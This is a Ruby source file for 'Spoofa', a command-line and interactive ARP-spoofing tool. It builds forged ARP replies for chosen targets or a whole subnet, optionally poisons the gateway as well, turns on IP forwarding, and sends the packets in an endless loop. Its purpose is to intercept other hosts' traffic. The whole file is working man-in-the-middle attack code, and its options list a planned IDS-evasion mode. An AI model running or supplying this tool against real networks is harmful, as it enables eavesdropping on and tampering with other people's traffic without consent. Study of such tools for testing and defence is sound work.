#!/usr/bin/env ruby

# SPOOFA - for ARP-spoofing local networks

# (C) 2013 Vulpi Argenti (SilverFoxx)

require 'packetfu'
require 'optparse'
require 'ostruct'
require 'ipaddr'

# What mode are we running in?
if ARGV.empty?
  interactive = true
else # Parse the command-line options
  unless ARGV.include?("-i")
    puts "Interface is required. See spoofa.rb -h.\nTry again"
    sleep 2 
  exit 0
  end
  options = OpenStruct.new
  OptionParser.new do |opts|
    opts.banner = "Usage: spoofa.rb # interactive mode\nUsage: spoofa.rb [-hmv] [-t target(s)] [-g gateway] -i interface # command-line mode"
    opts.separator ""
    opts.separator "Specific options:"

    opts.on("-v", "--verbose", "Run verbosely") do |v|
      options.verbose = v
    end

    opts.on("-m", "--smart", "[NOT WORKING YET] Smart ARPing; attempts various tricks to avoid IDS. If not set, ARP packets are sent continuously.") do |m|
      options.smart = m
    end

    opts.on("-t", "--target <target IP>", "One or more targets separated by comma (no whitespace), and/or a hyphened range. E.g. \"-t 192.168.1.10,192.168.1.50-100\". If omitted, all live targets in the entire subnet will be spoofed. Without [-g], one-way spoofing is performed, i.e. packets *from* the target are intercepted.") do |target|
      options.target = target
    end

    opts.on("-g", "--gateway <gateway IP>", "With [-t] set, performs two-way spoofing.") do |gateway|
      options.gateway = gateway
    end

    opts.on("-i", "--interface <interface>", "Interface") do |interface|
      options.interface = interface
    end

    opts.on("-h", "--help", "You're looking at it. If it's not good enough, try the README.md at https://github.com/SilverFoxx/Spoofa") do |h|
      puts opts
      exit 0
    end
  end.parse!
end

#----------------------------------------------------------------------#
# Assorted methods

def ip_check(ip)
  true if ip =~ /^(192|10|172)((\.)(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}$/
end

def puts_verbose(text)
  puts text if @verbose
end

def target_parse(target)
  target = target.split(",")
  @target = []                                          # Array of target ip's
  @target = target.select {|ip| ip_check(ip)}           # Move single ips to @target
  target.delete_if {|ip| ip_check(ip)}                  # Leaving range(s) in target
  target.each do |range|                                # Separate range(s) into start and end addresses
    from  = range[/\A(\w*.){3}(\w*)/]     
    to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
    ip_from   = IPAddr.new(from)
    ip_to     = IPAddr.new(to)
    (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
  end
end
  
def build_pkt(op_code, dest_mac, source_ip, dest_ip)
  @arp_pkt = PacketFu::ARPPacket.new
  @arp_pkt.arp_opcode = op_code
  @arp_pkt.eth_saddr = @arp_pkt.arp_saddr_mac = @defaults[:eth_saddr]
  @arp_pkt.eth_daddr = @arp_pkt.arp_daddr_mac = dest_mac
  @arp_pkt.arp_saddr_ip = source_ip
  @arp_pkt.arp_daddr_ip = dest_ip
end 
  
#----------------------------------------------------------------------#
# Let's set some defaults and variables

if interactive
  @verbose = true

  @defaults = PacketFu::Utils.ifconfig(Pcap.lookupdev)
  @iface = @defaults[:iface] 
  print "Default interface appears to be #{@iface}.\nEnter to accept #{@iface}, or type an alternative: "
  temp = gets.chomp
  unless temp.empty?
    @iface = temp
    @defaults = PacketFu::Utils.ifconfig(@iface)               # Iface changed, therefore need new defaults
  end

  until ip_check(@gateway) do
    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ }  # Guess gateway by parsing netstat
    @gateway = ((net[0]).split)[1] 
    if ip_check(@gateway)
    print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
    else
      print "Unable to determine gateway. Please enter IP: "
    end
    temp = gets.chomp
    @gateway = temp unless temp.empty?
    unless ip_check(@gateway)
      puts "Invalid IP address. Try again..."
      sleep 1
    end 
  end

  var = false
  until var 
    print "Spoof target only (1-way), or router as well (2-way)? (1/2): "
    var = gets.chomp
    if  var == "2"
      @two_way = true
    elsif var == "1"
      @two_way = false
    else
      var = false
      puts "Must enter \"1\" or \"2\"."
      sleep 1
    end
  end

  print "Enter target IP(s): "
  target = gets.chomp

# CL mode 
else  
  @verbose  = options.verbose
  @iface    = options.interface
  target    = options.target
  @gateway  = options.gateway
  @defaults = PacketFu::Utils.ifconfig(@iface)

  @two_way = true
  unless @gateway
    @two_way = false
    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Guess gateway by parsing netstat
    @gateway = ((net[0]).split)[1]
  end 
  unless ip_check(@gateway)
    print "Unable to verify gateway address. Try again with 2-way spoofing, or interactive mode."
    sleep 2
    exit 0
  end
end
broadcast = true if target.nil?

if @verbose  
  var1 = "S"
  if @two_way
    var2 = "two-way with gateway #{@gateway}."
  else
    var2 = "one-way."
  end
  if broadcast
    var3 = "entire network"
  else
    var3 = target
  end 
  puts "#{var1}poofing #{var3} on #{@iface}, #{var2}"
end

#----------------------------------------------------------------------#

puts_verbose("\nObtaining mac addresses...")
@gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
unless @gateway_mac 
  (0..1).map { @gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface) } # Try twice more, then exit.
  puts "Unable to determine gateway mac."
  sleep 2
  exit 0 
end
puts_verbose "#{@gateway}: mac is #{@gateway_mac} (Gateway)"

@targets_hash = {}
@target_packets  = []
@gateway_packets = []
if broadcast
  puts_verbose "Using broadcast address for targets"
  build_pkt(2, "ff:ff:ff:ff:ff:ff",  @gateway, "0.0.0.0")
  @target_packets << @arp_pkt
  if @two_way
    target_parse("#{(@defaults[:ip4_obj]).to_s}-255") # Make hash of network ip's, range 0-255
    @target.each do |ip|
      #Thread.new(ip) do |ip|
      target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
      @targets_hash[ip] = target_mac                  # Make hash of target ips => target macs
      #end
    end
    @targets_hash.delete_if { |k, v| v.nil? }
    @targets_hash.delete(@gateway)
  end
else  
  target_parse(target)
  @target.each do |ip|
    target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
    @targets_hash[ip] = target_mac     
    if target_mac
      puts_verbose "#{ip}: mac is #{target_mac}"
    else
      puts_verbose "#{ip}: is down, can't spoof"
    end
  end
  @targets_hash.delete_if { |k, v| v.nil? }
  end ### need to tell self real gateway?

# Make arrays of packets for targets and gateway
# Args for build_pkt are: op_code, dest_mac, source_ip, dest_ip
unless broadcast  # Have already made target packets (broadcast)
  @targets_hash.each do |target, target_mac|
    build_pkt(2, target_mac, @gateway, target)
    @target_packets << @arp_pkt
  end
end
if @two_way
  @targets_hash.each do |target, |
    build_pkt(2, @gateway_mac, target, @gateway)
    @gateway_packets  << @arp_pkt
  end
end
    
`echo 1 > /proc/sys/net/ipv4/ip_forward`
send_packets = true
while send_packets
  while true
    @target_packets.each do |pkt|
      pkt.to_w(@iface)
    end
    if @two_way
      @gateway_packets.each do |pkt|
        pkt.to_w(@iface)
      end
    end
    GC.start   # to deal with "memory leak" (more likely a problem calling GC)
    sleep 2
  end
end
